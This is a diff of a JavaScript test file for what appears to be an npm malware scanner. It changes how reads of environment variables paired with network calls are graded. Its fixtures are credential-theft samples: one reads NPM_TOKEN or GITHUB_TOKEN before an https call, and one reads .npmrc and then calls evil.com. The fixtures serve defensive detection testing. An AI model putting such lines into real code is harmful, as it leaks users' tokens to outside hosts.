@@ -169,8 +169,12 @@ test('curl | bash postinstall pattern is blocked by signature scanner', () => {
   expectBlocked(result);
 });
 
-// 9. Process.env access + network call – behavioral cross-module state machine
-test('process.env access + network call in one module triggers behavioral detection', () => {
+// 9. Process.env access + network call — F-16: bare env reads no longer hard-block.
+// CREDENTIAL_EXFILTRATION (CRITICAL) requires a genuine credential file read or a sensitive
+// path string. A plain process.env read + network call now emits ENV_NETWORK_EGRESS (WARN)
+// and is logged but not quarantined. Genuine exfiltration (file read + network) is still
+// caught at CRITICAL — see test 6.
+test('process.env + network call emits ENV_NETWORK_EGRESS WARN but does not hard-block (F-16)', () => {
   const src = pad(`
     const token = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
     const https = require('https');
@@ -178,7 +182,15 @@ test('process.env access + network call in one module triggers behavioral detect
     module.exports = {};
   `);
   const result = detector.scanModuleSync('env-exfil.js', src, 'env-exfil.js');
-  expectBlocked(result);
+  // Must surface a WARN-level ENV_NETWORK_EGRESS detection (for logging/telemetry)
+  const warnDetection = result.detections.find(d => d.rule === 'ENV_NETWORK_EGRESS');
+  assert.ok(warnDetection, `Expected ENV_NETWORK_EGRESS WARN detection but got: ${JSON.stringify(result.detections)}`);
+  assert.strictEqual(warnDetection.severity, 'WARN', 'ENV_NETWORK_EGRESS should be WARN severity');
+  assert.strictEqual(warnDetection.warnOnly, true, 'ENV_NETWORK_EGRESS must be warnOnly');
+  // Must NOT hard-block (no CRITICAL/HIGH detections)
+  const hardBlock = result.detections.find(d => !d.warnOnly);
+  assert.ok(!hardBlock, `process.env + network must not hard-block (F-16). Got: ${JSON.stringify(hardBlock)}`);
+  assert.strictEqual(result.action, 'OBSERVE', `Action must be OBSERVE, got: ${result.action}`);
 });
 
 // 10. Clean module – must NOT be blocked
@@ -265,11 +277,14 @@ test('Padded-payload: malicious signature after 3KB padding is blocked (F-03 reg
 
 // 16. Small module (<100 bytes) behavioral detection (F-07 regression guard)
 // Previously behavior-tracker.js had a `content.length < 100` guard that silently skipped
-// tiny modules. Even a 50-byte module can exfiltrate credentials.
+// tiny modules. Even a short module that reads a credential file and makes a network call
+// must be caught. Uses a genuine file-based credential read (fs.readFileSync + .npmrc path)
+// so the CRITICAL CREDENTIAL_EXFILTRATION rule fires — bare process.env is intentionally
+// demoted to WARN by F-16 and would not satisfy the block-tier assertion here.
 test('Sub-100-byte module with credential-read + network-egress triggers behavioral detection (F-07 regression guard)', () => {
   detector.behaviorTracker.reset();
-  // 72-byte payload: reads env (sensitiveRead) and makes a network call (networkEgress)
-  const src = 'process.env.SECRET; https.get("http://evil.com");';
+  // Short payload: reads .npmrc (sensitiveRead + sensitivePath) and makes a network call
+  const src = "fs.readFileSync('.npmrc'); require('https').get('http://evil.com');";
   assert.ok(src.length < 100, `Fixture must be <100 bytes (actual: ${src.length})`);
   const result = detector.scanModuleSync('tiny-exfil.js', src, 'tiny-exfil.js');
   const blockDetections = result.detections.filter(d => !d.warnOnly);
